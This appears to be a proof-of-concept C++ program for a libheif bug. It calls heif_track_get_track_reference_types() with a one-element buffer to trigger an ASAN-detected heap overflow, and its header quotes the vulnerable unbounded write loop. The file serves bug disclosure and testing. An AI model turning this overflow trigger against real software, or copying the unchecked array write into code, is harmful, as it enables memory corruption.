/*
 * POC for Bug 08:
 * heif_track_get_track_reference_types() writes all tref reference-type codes
 * into a caller-supplied array without any bounds/capacity check.
 * If the buffer is smaller than the number of distinct reference types in the
 * tref box the function walks off the end of the heap allocation.
 *
 * Affected file : libheif/api/libheif/heif_sequences.cc:760
 * Affected API  : void heif_track_get_track_reference_types(const heif_track*,
 *                                                           uint32_t[])
 *
 * Vulnerable code (heif_sequences.cc:751-762):
 *   void heif_track_get_track_reference_types(const heif_track* track,
 *                                             uint32_t out_reference_types[])
 *   {
 *     auto tref = track->track->get_tref_box();
 *     if (!tref) { return; }
 *     auto refTypes = tref->get_reference_types();
 *     for (size_t i = 0; i < refTypes.size(); i++) {   // no capacity check
 *       out_reference_types[i] = refTypes[i];           // OOB write at i >= 1
 *     }
 *   }
 *
 * Strategy:
 *   1. Read poc08_10reftypes.heif — a pre-built HEIF file containing 11 tracks:
 *      10 target tracks + 1 source track that carries 10 distinct tref types.
 *   2. Find the source track (the one with max reference types).
 *   3. Allocate a buffer for only 1 uint32_t slot.
 *   4. Call heif_track_get_track_reference_types() with the under-sized buffer.
 *      The loop iterates 10 times, writing 9 uint32_t values past the end
 *      of the 1-element heap allocation.
 *
 * Expected ASAN output:
 *   ERROR: AddressSanitizer: heap-buffer-overflow
 *   WRITE of size 4 at ...
 *   in heif_track_get_track_reference_types
 *
 * Build: see build.sh
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

#include "libheif/heif_context.h"
#include "libheif/heif_sequences.h"

int main(int argc, char* argv[])
{
    const char* heif_file = (argc > 1) ? argv[1] : "/tmp/poc08_10reftypes.heif";

    // ---- Step 1: read the HEIF file -----------------------------------------
    heif_context* ctx = heif_context_alloc();
    heif_error err = heif_context_read_from_file(ctx, heif_file, nullptr);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "[poc08] heif_context_read_from_file('%s') failed: %s\n",
                heif_file, err.message);
        heif_context_free(ctx);
        return 1;
    }

    int total_tracks = heif_context_number_of_sequence_tracks(ctx);
    fprintf(stderr, "[poc08] Total tracks: %d\n", total_tracks);

    if (total_tracks < 1) {
        fprintf(stderr, "[poc08] No sequence tracks found\n");
        heif_context_free(ctx);
        return 1;
    }

    // ---- Step 2: collect all track IDs using a correctly-sized buffer --------
    std::vector<uint32_t> ids(total_tracks);
    heif_context_get_track_ids(ctx, ids.data());  // correct-sized buffer

    // ---- Step 3: find the track with the most reference types ---------------
    heif_track* src_track = nullptr;
    int max_ref_types = 0;

    for (int i = 0; i < total_tracks; i++) {
        heif_track* t = heif_context_get_track(ctx, ids[i]);
        if (!t) continue;
        int n = (int)heif_track_get_number_of_track_reference_types(t);
        if (n > max_ref_types) {
            max_ref_types = n;
            if (src_track) heif_track_release(src_track);
            src_track = t;
        } else {
            heif_track_release(t);
        }
    }

    if (!src_track || max_ref_types < 2) {
        fprintf(stderr, "[poc08] Could not find a track with multiple ref types "
                "(found max=%d)\n", max_ref_types);
        if (src_track) heif_track_release(src_track);
        heif_context_free(ctx);
        return 1;
    }

    fprintf(stderr, "[poc08] Source track has %d distinct reference types\n",
            max_ref_types);

    // ---- Step 4: allocate a SMALL buffer (1 slot only) ----------------------
    // ASAN allocates exactly 1 * sizeof(uint32_t) = 4 bytes.
    const int SMALL = 1;
    uint32_t* small_buf = (uint32_t*)malloc(SMALL * sizeof(uint32_t));
    if (!small_buf) { perror("malloc"); return 1; }

    fprintf(stderr,
            "[poc08] Calling heif_track_get_track_reference_types() with buf[%d] "
            "but track has %d ref types — OOB write by %d uint32_t words\n",
            SMALL, max_ref_types, max_ref_types - SMALL);

    // ---- Step 5: trigger the OOB write --------------------------------------
    // heif_sequences.cc:760-768 indexes out_reference_types[0..9] unconditionally.
    heif_track_get_track_reference_types(src_track, small_buf);  // <-- OOB write

    // Reached only without ASAN:
    fprintf(stderr, "[poc08] reftype[0]=0x%08X (heap is now corrupted)\n",
            small_buf[0]);

    free(small_buf);
    heif_track_release(src_track);
    heif_context_free(ctx);
    return 0;
}
